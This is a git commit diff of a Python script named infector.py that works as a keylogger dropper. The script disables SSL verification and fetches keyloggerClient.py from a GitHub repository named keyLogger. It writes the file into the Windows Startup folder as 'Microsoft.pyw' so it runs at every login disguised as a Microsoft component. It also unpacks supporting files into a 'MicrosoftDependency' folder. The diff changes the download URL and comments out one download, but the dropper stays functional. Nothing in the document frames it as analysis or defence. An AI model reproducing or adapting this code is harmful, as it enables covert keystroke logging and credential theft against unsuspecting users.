c73d3172ea2b0616b178da23a993b08913a35e9e
simone mastella <simonemastella@gmail.com>
2021-10-09 11:41:27 +0200

    setting 1

--- infector.py
+++ infector.py
@@ -3,12 +3,11 @@ import os,sys,urllib.request,zipfile,subprocess,ssl
 ssl._create_default_https_context = ssl._create_unverified_context
 percorsoA='C:\\Users\\'+os.getlogin()+'\\AppData\\Local\\Programs\\'
 percorsoB='C:\\Users\\'+os.getlogin()+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
-url='https://raw.githubusercontent.com/simonemastella/scriptSHnPY/master/PyScript/'
+url='https://raw.githubusercontent.com/simonemastella/keyLogger/main/'
 sys.path.append(percorsoA)
-urllib.request.urlretrieve(url+'Base.zip', percorsoA+'Base.zip')
+# urllib.request.urlretrieve(url+'Base.zip', percorsoA+'Base.zip')
 urllib.request.urlretrieve(url+'keyloggerClient.py', percorsoB+'Microsoft.pyw')
 with zipfile.ZipFile(percorsoA+'Base.zip') as zf:
     zf.extractall(percorsoA+'\\MicrosoftDependency\\')
 os.remove(percorsoA+'Base.zip')
-import MicrosoftDependency.Microsoft
 #--------end------------
